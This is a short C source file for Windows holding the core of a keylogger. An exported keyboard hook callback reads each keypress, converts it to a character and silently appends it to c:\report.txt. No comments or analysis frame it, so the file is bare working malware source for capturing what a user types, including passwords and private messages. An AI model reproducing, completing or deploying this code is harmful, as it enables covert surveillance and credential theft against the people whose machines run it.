#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

static FILE* f1 = NULL;
static HHOOK hkb;

static void logChar(char character) {
    FILE* f1 = fopen("c:\\report.txt","a+");
    fwrite(&character,1,1,f1);
    fclose(f1);
}

LRESULT __declspec(dllexport)__stdcall CALLBACK keyboard_hook_callback(int ncode, WPARAM wparam, LPARAM lparam) {

    if (((DWORD)lparam & 0x40000000) &&(HC_ACTION==ncode)) {
        if ((wparam==VK_SPACE)||(wparam==VK_RETURN)||(wparam>=0x2f ) &&(wparam<=0x100)) {
            if (wparam==VK_RETURN)
                logChar('\n');
            else {
                BYTE ks[256];
                GetKeyboardState(ks);

                WORD w;
                UINT scan=0;
                ToAscii(wparam,scan,ks,&w,0);
                logChar((char) w);
            }
        }
    }

    return CallNextHookEx(hkb, ncode, wparam, lparam);
}